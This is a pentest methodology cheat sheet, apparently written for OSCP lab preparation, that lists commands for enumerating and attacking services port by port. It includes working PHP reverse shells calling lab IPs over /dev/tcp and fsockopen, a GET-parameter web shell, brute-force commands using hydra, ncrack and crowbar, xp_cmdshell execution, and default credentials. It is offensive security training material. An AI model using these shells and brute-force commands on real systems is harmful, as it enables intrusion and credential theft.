# ariel-shin Foothold Methodology 
### Based on [sushant747 List of common ports](https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html). A majority of this guide is modified from sushant747.

## MUST RUN: ipconfig/ifconfig && whoami && cat local.txt/proof.txt

## Summary 
* [Discovering Open Ports](#discovering-open-ports)
* [File Upload Capability](#file-upload-capability)
* [Port 21 - FTP](#Port-21---FTP)
* [Port 22 - SSH](#Port-22---SSH)
* [Port 23 - Telnet](#Port-23---Telnet)
* [Port 25 - SMTP](#Port-25---SMTP)
* [Port 69 - TFTP](#Port-69---TFTP)
* [Port 80/443 - HTTP/HTTPS](#Port-80443---HTTPHTTPS)
* [Port 88 - Kerberos](#Port-88---Kerberos)
* [Port 110 - POP3](#Port-110---POP3)
* [Port 111 - Rpcbind](#Port-111---Rpcbind)
* [Port 119 - NNTP](#Port-119---NNTP)
* [Port 135 - MSRPC](#Port-135---MSRPC)
* [Port 139 and 445 - SMB/Samba Shares](#port-139-and-445---smbsamba-shares)
* [Port 143/993 - IMAP](#port-143993---imap)
* [Port 161 and 162 - SNMP](#Port-161-and-162---SNMP)
* [Port 199 - Smux](#Port-199---Smux)
* [Port 389/636 - Ldap](#Port-389636---Ldap)
* [Port 445 - SMB](#Port-445---SMB)
* [Port 554 - RTSP](#Port-554---RTSP)
* [Port 587 - Submission](#Port-587---Submission)
* [Port 631 - Cups](#Port-631---Cups)
* [Port 993 - Imap Encrypted](#Port-993---Imap-Encrypted)
* [Port 995 - POP3 Encrypten](#Port-995---POP3-Encrypten)
* [Port 1025 - NFS or IIS](#Port-1025---NFS-or-IIS)
* [Port 1030/1032/1033/1038](#Port-1030103210331038)
* [Port 1433 - MsSQL](#Port-1433---MsSQL)
* [Port 1521 - Oracle database](#Port-1521---Oracle-database)
* [Ports 1748, 1754, 1808, 1809 - Oracle](#ports-1748-1754-1808-1809---oracle)
* [Port 2049 - NFS](#Port-2049---NFS)
* [Port 2100 - Oracle XML DB](#Port-2100---Oracle-XML-DB)
* [Port 3268 - globalcatLdap](#Port-3268---globalcatLdap)
* [Port 3306 - MySQL](#Port-3306---MySQL)
* [Port 3339 - Oracle web interface](#Port-3339---Oracle-web-interface)
* [Port 3389 - Remote Desktop Protocol](#Port-3389---Remote-Desktop-Protocol)
* [Port 4445 - Upnotifyp](#Port-4445---Upnotifyp)
* [Port 4555 - RSIP](#Port-4555---RSIP)
* [Port 47001 - Windows Remote Management Service](#Port-47001---Windows-Remote-Management-Service)
* [Port 5357 - WSDAPI](#Port-5357---WSDAPI)
* [Port 5722 - DFSR](#Port-5722---DFSR)
* [Port 5900 - VNC](#Port-5900---VNC)
* [Port 8080](#Port-8080--HTTP-Alternate)
* [Port 9389](#Port-9389--Active-Directory-Web-Services)
* [Other Port](#Other-Ports)
* [Cracking Passwords](#Cracking-Passwords)
* [Brute-forcing Login](#Brute-forcing-Login)
* [Resources](#Resources)
* [Tips for when you're stuck](#tips-for-when-youre-stuck)

## Discovering Open Ports 
* Nmap 
```nmap
nmap -v -A -p- --reason -T4 -iL IPTextFile.txt -oA nmap
-v: verbose
-A: aggressive, detect OS and services
-p-: all ports
--reason: gives reason 
-T4: speeds up the scan 
-iL: inputList
-oA: output all files 
```
* unicornscan 
```unicorn
unicornscan IP 
```
Check for UDP 
```uniudp
unicornscan -pa -mU 10.11.1.226
nmap -sU -T4 10.11.1.# 
```
* masscan 
Checks for TCP and UDP
```masscan
masscan -p1-65535,U:1-65535 10.10.10.63 --rate=1000 -e tun0
```
* Scripts
Find common vulnerabilities
```nmapscripts
nmap -T4 -p445 --script vuln 10.10.10.# -oN outputFile.txt
nmap -T4 -p445 --script "*vuln*" 10.10.10.# -oN outputFile2.txt
nmap -T4 -p445 --script "ftp*" 10.10.10.# -oN outputFile3.txt
```

[Back](#summary)

## File Upload Capability

### Tools
* davtest
```davtest
davtest -url http://localhost/davdir
```

* cadavaer
Example with webdav xampp default creds
```cadaver
cadaver http://<REMOTE HOST>/webdav/
user: wampp
pass: xampp

put /tmp/helloworld.txt
```
load URL, http://<REMOTE HOST>/webdav/helloworld.txr


### LFI
* End Files with %00 (Null Byte)
	* E.g. /etc/passwd%00

### RFI
* PHP Reverse Shell
	* Linux
		Create a php shell (test.php) and host it 
		```lsal
		<?php echo shell_exec("ls -al");?>
		```
		If above works, test reverse shell from pentest monkey

		```pentestmonkey
		<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.65/443 0>&1");?>
		```
		When inserting a payload, try host IP and http://hostIP

		Set up listener

		```
		nc -nlvp 443
		```
	* php no shell exec on linux
		```
		<?php $sock = fsockopen("10.11.0.99",443);$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
		```
		[Reverse Shell Details](http://lerned.wikidot.com/reverse-shell-command)

		Set up listener
		```
		nc -nlvp 443
		```
	* Windows
		```
		<?php echo(system($_GET["cmd"])); ?>
		```
		Go to http://victimsite.com/test.php?cmd=dir for command execution 

		* [Windows PHP Reverse Shell](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)
	* [Other languages/compabibility](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
	* [Full shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
		* wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
	* Reverse Shell Not working
		* Try hosting it on port 80 or 443
		* Try using Apache webserver
		* Try including the reverse shell with http or https

* Hosting a shell
	* Python Web Server
	```
	python -m SimpleHTTPServer 80
	```
	* Apache Webserver
	```apache
	apache2ctl start | stop
	```

[Back](#summary)

## Port 21 - FTP
FIRST STEP: Discover version number from nmap or steps below
Connect to the ftp-server to enumerate software and version 
```ftp
ftp 192.168.1.101
nc 192.168.1.101 21
```
Always try to login with anonymous:anonymous
Note: If you upload a binary file you have to put the ftp-server in binary file, or the file will become corrupted
```binary
ftp> binary 
200 Type set to I. 
ftp> put accesschk.exe
local: accesschk.exe remote: accesschk.exe
200 PORT command successful 
150 Opening BINARY mode data connection for accesschk.exe.
226 Transfer complete. 
331888 bytes sent in 0.27 secs (1.1515 MB/s)
```

[Back](#summary)

## Port 22 - SSH 
Can determine version by scanning it with nmap or connecting to it with nc or telnet
```nc
nc 192.168.1.10 22
telnet 192.168.1.10 22
```

[Back](#summary)

## Port 23 - Telnet
Telnet is considered insecure because it does not encrypt traffic. Search exploit-db and it will show various RCE-vulnerbailites on different versions. 
* Brute Force it
```bt
hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet
```

[Back](#summary)

## Port 25 - SMTP
* SMTP is a server to server service. The user receives or sends emails using IMAP or POP3. Those messages are then routed to the SMTP-server which communicates the email to another server. The SMTP-server has a database with all emails that can receive or send emails. We can use SMTP to query that database for possible email-addresses. Notice that we cannot retrieve any emails from SMTP. We can only send emails.

* Commands
	```cmds
	HELO - 
	EHLO - Extended SMTP.
	STARTTLS - SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic.
	RCPT - Address of the recipient.
	DATA - Starts the transfer of the message contents.
	RSET - Used to abort the current email transaction.
	MAIL - Specifies the email address of the sender.
	QUIT - Closes the connection.
	HELP - Asks for the help screen.
	AUTH - Used to authenticate the client to the server.
	VRFY - Asks the server to verify is the email user's mailbox exists.
	```

* Discover usernames 
	```manual
	nc 192.168.1.103 25
	220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
	VRFY root
	252 2.0.0 root
	VRFY roooooot
	550 5.1.1 <roooooot>: Recipient address rejected: User unknown in local recipient table
	```
  * VRFY, EXPN, and RCPT can be used to identify users
* Telnet
	```telnet
	telnet 10.11.1.229 25
	```
* Automated
  * Check for commands
  	```cmdsnmap
  	nmap -script smtp-commands.nse 192.168.1.101
  	```
  * smtp-user-enum
  	```
	smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 192.168.1.103
	```

[Back](#summary)

## Port 69 - TFTP
Ftp-server but it uses UDP

[Back](#summary)

## Port 80/443 - HTTP/HTTPS

### Web App Methodology
* niktto
	```
	nikto -h url -o niktodp80.txt
	```
* gobuster
	```
	gobuster -u url -w wordlist.txt -x txt,php,xml,html -e -o gobustedp80.txt
	```
	* Wordlists 
		* Dirb - /usr/share/dirb/wordlists
		* wfuzz - /usr/share/wfuzz/wordlists
		* SecList - /usr/share/SecLists
	* go deeper one level or use dirb
* dirb 
	* automatically does the recrusive search 
	```
	dirb http://site.com wordlist -o dirb.txt
	```
	* -N: ignore response code
	* -r: don't search recursively
* Check github for CMS etc. 
* Look for hidden directories with cewl and guessing words on the website
	* e.g. ask jeeves --> /jeeves or /askjeeves
* Look at robots.txt
* Look for readme.txt
* Look at source code for comments on what service is running or sensitive information
* Google the page 
* Login Console
	* Google it 
	* Look for usernames
	* Guess passwords
		* root, toor, password, admin, administrator
		* admin:""
		* admin:admin
		* admin:password
		* root:""
		* root:root
		* root:toor
		* root:password
	* Use Cewl
* WordPress
	* WPScan
	* brute force a user
	```
	wpscan --url 10.11.1.# --wordlist /usr/share/wordlists/rockyou.txt --username admin 
	```
* Drupal
	```
	droopescan scan drupal -u IP:PORT
	```

### Heartbleed

#### nmap 
```heartbleed
nmap -sV --script=ssl-heartbleed 192.168.101.8
```

#### metasploit
```
use auxiliary/scanner/ssl/openssl_heartbleed
```
[Back](#summary)

## Port 88 - Kerberos
Kerberos is a protocol that is used for network authentication. Different versions are used by \*nix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.
If you already have a login to a user of that domain you might be able to escalate that privilege.
Check out: MS14-068

[Back](#summary)

## Port 110 - POP3
This service is used for fetching emails on a email server. So the server that has this port open is probably an email-server, and other clients on the network (or outside) access this server to fetch their emails.
```POP3
telnet 192.168.1.105 110
USER pelle@192.168.1.105
PASS admin

# List all emails
list

# Retrive email number 5, for example
retr 5
```

[Back](#summary)

## Port 111 - Rpcbind
RFC: 1833
Rpcbind can help us look for NFS-shares. So look out for nfs. Obtain list of services running with RPC:
```rpcbind
rpcbind -p 192.168.25.#

# if shares exists, then confirm it
showmount -e 192.168.25.#
# should list fileshares 

#display fileshares
df -h 
# returns /temp 

# create a temp directory to mount fileshare on attacker box
mkdir /temp/
mount -t nfs 192.168.25.#:/ /temp -o nolock

change directories and view files
# cd /temp
# ls 
```
* Look for sensitive information (e.g. passwords, file locations, ssh keys, etc)
* See if there is file upload capability

[Back](#summary)

## Port 119 - NNTP
Network time protocol. It is used synchronize time. If a machine is running this server it might work as a server for synchronizing time. So other machines query this machine for the exact time.
An attacker could use this to change the time. Which might cause denial of service and all around havoc.

[Back](#summary)

## Port 135 - MSRPC
Windows RPC-Port
Check for Ports 25 and 445
Vulnerable to MS ? TO DO
* Enumerate
``` nmap135
nmap 192.168.0.101 --script=msrpc-enum
```

[Back](#summary)

## Port 139 and 445 - SMB/Samba Shares
Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server.

[Back](#summary)

### smbclient 
* For linux-users you can log in to the smb-share using smbclient, like this:
```smbclient
smbclient -L 192.168.1.102
smbclient //192.168.1.106/tmp
smbclient \\\\192.168.1.105\\ipc$ -U john 
smbclient //192.168.1.105/ipc$ -U john
```
TO DO: Anonymous Login 
* If you don't provide any password, just click enter, the server might show you the different shares and version of the server. This can be useful information for looking for exploits. There are tons of exploits for smb.
* So smb, for a linux-user, is pretty much like and ftp or a nfs.
* Here is a (good guide for how to configure samba)[https://help.ubuntu.com/community/How%20to%20Create%20a%20Network%20Share%20Via%20Samba%20Via%20CLI%20(Command-line%20interface/Linux%20Terminal)%20-%20Uncomplicated,%20Simple%20and%20Brief%20Way]
```mount
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
```

### Enum4linux
Enum4linux can be used to enumerate windows and linux machines with smb-shares.
```enum4linux
enum4linux -a 192.168.1.120
```

### rpcclient
You can also use rpcclient to enumerate the share.
Connect with a null-session. That is, without a user. This only works for older windows servers.
```
rpcclient -U "" 192.168.1.101
```

Once connected, you can enter commands like: 
```rpc
srvinfo
enumdomusers
getdompwinfo
querydominfo
netshareenum
netshareenumall
```

### Connecing with PSExec
TO DO
metasploit: use exploit/windows/smb/psexec

### Scanning with nmap 
```nmap139445
nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse, smb-os-discovery.nse
nmap -p 139,445 --script "smb-vuln*" 10.11.11.#
```
TO DO: FINISH THIS

### nbtscan 
```nbtscan
nbtscan -r 192.168.1.1/24
```
* [Netbios Write-up](https://null-byte.wonderhowto.com/how-to/enumerate-netbios-shares-with-nbtscan-nmap-scripting-engine-0193957/)

[Back](#summary)

## Port 143/993 - IMAP
* IMAP lets you access email stored on that server. So imagine that you are on a network at work, the emails you recieve is not stored on your computer but on a specific mail-server. So every time you look in your inbox your email-client (like outlook) fetches the emails from the mail-server using imap.
* IMAP is a lot like pop3. But with IMAP you can access your email from various devices. With pop3 you can only access them from one device.
* Port 993 is the secure port for IMAP.

[Back](#summary)

## Port 161 and 162 - SNMP
Simple Network Management Protocol

SNMP protocols 1,2 and 2c does not encrypt its traffic. So it can be intercepted to steal credentials.

SNMP is used to manage devices on a network. It has some funny terminology. For example, instead of using the word password the word community is used instead. But it is kind of the same thing. A common community-string/password is public.

You can have read-only access to the snmp.Often just with the community string public.

snmp-check
```
snmp-check -c public  10.11.1.13 
*also check private, public, manager 
```

Common community strings
```common
public
private
community
```

* [Longer list of common community strings](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt)

### MIB - Management Information Base
SNMP stores all the data in the Management Information Base. The MIB is a database that is organized as a tree. Different branches contains different information. So one branch can be username information, and another can be processes running. The "leaf" or the endpoint is the actual data. If you have read-access to the database you can read through each endpoint in the tree. This can be used with snmpwalk. It walks through the whole database tree and outputs the content.

#### snmpwalk 
```snmpwalk
snmpwalk -c public -v1 192.168.1.101 #community string and which version
```
This command will output a lot of information. Way to much, and most of it will not be relevant to us and much we won't understand really. So it is better to request the info that you are interested in. Here are the locations of the stuff that we are interested in:
```
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```
Now we can use this to query the data we really want.

#### snmpenum

#### snmp-check
This is a bit easier to use and with a lot prettier output.
```
snmp-check -t 192.168.1.101 -c public
```

### Scan for open ports - Nmap
Since SNMP is using UDP we have to use the -sU flag.
```
nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt
```

### Onesixty one
With onesixtyone you can test for open ports but also brute force community strings. I have had more success using onesixtyone than using nmap. So better use both.

### Metasploit
There are a few [snmp modules in metasploit](https://www.offensive-security.com/metasploit-unleashed/snmp-scan/) that you can use. snmp_enum can show you usernames, services, and other stuff.

[Back](#summary)

## Port 199 - Smux

[Back](#summary)

## Port 389/636 - Ldap
Lightweight Directory Access Protocol. This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation. Ldap is used more often in corporate structure. Webapplications can use ldap for authentication. If that is the case it is possible to perform ldap-injections which are similar to sqlinjections.

You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users.

```ldapsearch
ldapsearch -h 192.168.1.101 -p 389 -x -b "dc=mywebsite,dc=com"
```
When a client connects to the Ldap directory it can use it to query data, or add or remove.
Port 636 is used for SSL.
There are also metasploit modules for Windows 2000 SP4 and Windows Xp SP0/SP1

[Back](#summary)

## Port 445 - SMB
* [Port 139 & 445](#port-139-and-445---smbsamba-shares)
* [Eternal Blue](https://www.hackingarticles.in/smb-penetration-testing-port-445/)

[Back](#summary)


## Port 554 - RTSP
RTSP (Real Time Streaming Protocol) is a stateful protocol built on top of tcp usually used for streaming images. Many commercial IP-cameras are running on this port. They often have a GUI interface, so look out for that.

[Back](#summary)

## Port 587 - Submission
* Outgoing smtp-port
* If Postfix is run on it it could be vunerable to [shellshock](https://www.exploit-db.com/exploits/34896/)

[Back](#summary)

## Port 631 - Cups
* Common UNIX Printing System has become the standard for sharing printers on a linux-network. You will often see port 631 open in your priv-esc enumeration when you run netstat. You can log in to it here: http://localhost:631/admin
* You authenticate with the OS-users.
* Find version. Test cups-config --version. If this does not work surf to http://localhost:631/printers and see the CUPS version in the title bar of your browser.
* There are vulnerabilities for it so check your searchsploit.

[Back](#summary)

## Port 993 - Imap Encrypted
The default port for the Imap-protocol.

[Back](#summary)

## Port 995 - POP3 Encrypten
* Port 995 is the default port for the Post Office Protocol. The protocol is used for clients to connect to the server and download their emails locally. You usually see this port open on mx-servers. Servers that are meant to send and recieve email.
* Related ports: 110 is the POP3 non-encrypted.
* 25, 465

[Back](#summary)

## Port 1025 - NFS or IIS
Open on windows machine. But nothing has been listening on it.

[Back](#summary)

## Port 1030/1032/1033/1038
I think these are used by the RPC within Windows Domains. I have found no use for them so far. But they might indicate that the target is part of a Windows domain. Not sure though.

[Back](#summary)

## Port 1433 - MsSQL
Default port for Microsoft SQL.
```mssql
sqsh -S 192.168.1.101 -U sa
```

### Execute Commands
```exec
# To execute the date command to the following after logging in
xp_cmdshell 'date'
go
```

Many of the scanning modules in metasploit requires authentication. But some do not.
```aux
use auxiliary/scanner/mssql/mssql_ping
```

### Brute force
```bf
scanner/mssql/mssql_login
```
If you have credentials look in metasploit for other modules.

## Port 1521 - Oracle database
* Enumeration
```enum
tnscmd10g version -h 192.168.1.101
tnscmd10g status -h 192.168.1.101
```
* Brute force the ISD
```isd
auxiliary/scanner/oracle/sid_brute
```
* Connect to the datbaase with sqlplus
* [Reference](http://www.red-database-security.com/wp/itu2007.pdf)

## Ports 1748, 1754, 1808, 1809 - Oracle
These are also ports used by oracle on windows. They run Oracles Intelligent Agent.

[Back](#summary)

## Port 2049 - NFS
Network file system This is a service used so that people can access certain parts of a remote filesystem. If this is badly configured it could mean that you grant excessive access to users.

If the service is on its default port you can run this command to see what the filesystem is sharing
```showmount
showmount -e 192.168.1.109
```

Then you can mount the filesystem to your machine using the following command
```mount
mount 192.168.1.109:/ /tmp/NFS
mount -t 192.168.1.109:/ /tmp/NFS
```
Now we can go to /tmp/NFS and check out /etc/passwd, and add and remove files.
This can be used to escalate privileges if it is not correct configured. Check chapter on [Linux Privilege Escalation](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html).

[Back](#summary)

## Port 2100 - Oracle XML DB
* There are some exploits for this, so check it out. You can use the default Oracle users to access to it. You can use the normal ftp protocol to access it.
* Can be accessed through ftp. Some default passwords [here](https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm) Name: Version:
* Default logins: sys:sys scott:tiger

[Back](#summary)

## Port 3268 - globalcatLdap

[Back](#summary)

## Port 3306 - MySQL
Always test the following credential root:root
```mysql
mysql --host=192.168.1.101 -u root -p
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
mysql -h <Hostname> -u ""@localhost

telnet 192.168.0.101 3306
```
Will likely see
```
ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL server
```
This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1. This is a reasonable security measure put up to protect the database.

[Back](#summary)

### Configuration Files
```
cat /etc/my.cnf
```
[Reference](http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html)

### Mysql-commands cheat sheet
[Cheat sheet](http://cse.unl.edu/~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html)

### Uploading a shell
You can also use mysql to upload a shell

### Escalating Privileges
If mysql is started as root you might have a chance to use it as a way to escalate your privileges.

### MYSQL UDF INJECTION
[Gaining a root shell](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)

### Finding passwords to mysql
* You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your privilege. One way to do that is to look into the databse and see what users and passwords that are available. Maybe someone is resuing a password?
* So the first step is to find the login-credencials for the database. Those are usually found in some configuration-file oon the web-server. For example, in joomla they are found in:
```config
/var/www/html/configuration.php
```

In that file you find the
```
<?php
class JConfig {
    var $mailfrom = 'admin@rainng.com';
    var $fromname = 'testuser';
    var $sendmail = '/usr/sbin/sendmail';
    var $password = 'myPassowrd1234';
    var $sitename = 'test';
    var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system';
    var $MetaKeys = 'joomla, Joomla';
    var $offline_message = 'This site is down for maintenance. Please check back again soon.';
    }
```

## Port 3339 - Oracle web interface

[Back](#summary)

## Port 3389 - Remote Desktop Protocol
* Login with rdesktop or xfreerdp 
```rdp
rdesktop -u guest -p guest 10.11.1.5 -g 80%
xfreerdp /v:(target) /u:(user) /p:(password)
```
* Brute force 
```bf
rdesktop 192.168.1.101 //check version and sometimes username
ncrack -vv -u Administrator -P /root/passwords.txt rdp://192.168.1.101
ncrack -vv -u Administrator -P /root/passwords.txt -p 3389 192.168.1.101
crowbar -b rdp -s 10.11.1.7/32 -u root -C rdp_passlist.txt -n 1
```
* [RDP Wordlist](https://raw.githubusercontent.com/jeanphorn/wordlist/master/rdp_passlist.txt)
* msfconsole for ms12-020 is a dos attack; cant use


### MS12-020
This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can only DOS a machine using this exploit.

[Back](#summary)

## Port 4445 - Upnotifyp
Not much found anything here. Try connecting with netcat and visiting in browser.

[Back](#summary)

## Port 4555 - RSIP
This port has been used by Apache James Remote Configuration.
There is an exploit for [version 2.3.2](https://www.exploit-db.com/docs/40123.pdf)

[Back](#summary)

## Port 47001 - Windows Remote Management Service
Windows Remote Management Service

[Back](#summary)

## Port 5357 - WSDAPI

[Back](#summary)

## Port 5722 - DFSR
* The Distributed File System Replication (DFSR) service is a state-based, multi-master file replication engine that automatically copies updates to files and folders between computers that are participating in a common replication group. DFSR was added in Windows Server 2003 R2.
* I am not sure how what can be done with this port. But if it is open it is a sign that the machine in question might be a Domain Controller.

[Back](#summary)

## Port 5900 - VNC
* VNC is used to get a screen for a remote host. But some of them have some exploits.
* You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali.
* It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when you use VNC it assumes that user. Also note that the password is not the user password on the machine. If you have dumped and cracked the user password on a machine does not mean you can use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit module that dumps VNC passwords
	
```commands
background
use post/windows/gather/credentials/vnc
set session X
exploit
```

vncviewer 
```
vncviewer 192.168.1.109
```

### Ctrl-alt-del
* If you are unable to input ctr-alt-del (kali might interpret it as input for kali).
	* Try shift-ctr-alt-del
* Macbook: 
	* Click fn → f8 
	* Send ctrl-alt-del 

### Metasploit scanner
You can scan VNC for logins, with bruteforce.
Login scan
```aux
use auxiliary/scanner/vnc/vnc_login
set rhosts 192.168.1.109
run
```
Scan for no-auth
```aux2
use auxiliary/scanner/vnc/vnc_none_auth
set rhosts 192.168.1.109
run
```

[Back](#summary)

## Port 8080 - HTTP Alternate

### Tomcat
Tomcat suffers from default passwords. There is even a module in metasploit that enumerates common tomcat passwords. And another module for exploiting it and giving you a shell.

[Back](#summary)

## Port 9389 - Active Directory Web Services
Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).

[Back](#summary)

## Other Ports
* Netcat
```
nc IP port
```
* telnet
```
telnet IP port
```
* Google it

[Back](#summary)

## Cracking Passwords
* Google it
* Search on hashkiller.co.uk
* Confirm type of hash
```
hash-identifier [HASH]
```
* Confirm the format (e.g if MD5, check enough characters)
	* MD5 of "admin": 21232f297a57a5a743894a0e4a801fc3 
	* [md5 decrypt](https://www.md5online.org/md5-decrypt.html)
	* remove first character, last character, try to fit it in
* John The Ripper
```
john textfile
```

[Back](#summary)

## Brute-forcing Login
* Hydra
```
hydra -L users.txt -e nsr ftp://IPADDRESS
```
	* -e nsr: normal, backward, and blank
		* e.g. ftp:ftp, ftp:ptf, ftp:""
Brute force with a list of passwords
```
cp /usr/share/john/password.lst password.lst
hydra -t 1 -L users.txt -P password.lst -vV 10.11.1.# ftp
```
[Write-Up](https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/
)

[Back](#summary)

## Resources
* [Sushant747](https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html)
* [0Day](http://www.0daysecurity.com/penetration-testing/enumeration.html)
* [Commands to walkthrough](https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md#file-inclusion-vulnerabilities)

[Back](#summary)

## Tips for when you're stuck
* [Calm down](https://www.youtube.com/watch?v=F28MGLlpP90)
* Revert the box 
* Take a breath, look at the nmap scan and start over 
* Look at all the ports, try hitting it with http, telnet, or nc
* Fix the exploit
	* Google the exploit for modified versions 
* Check searchsploit instead of google
	* Check duckduckgo instead of google
* Look for nmap scripts to confirm the vulnerability

[Back](#summary)
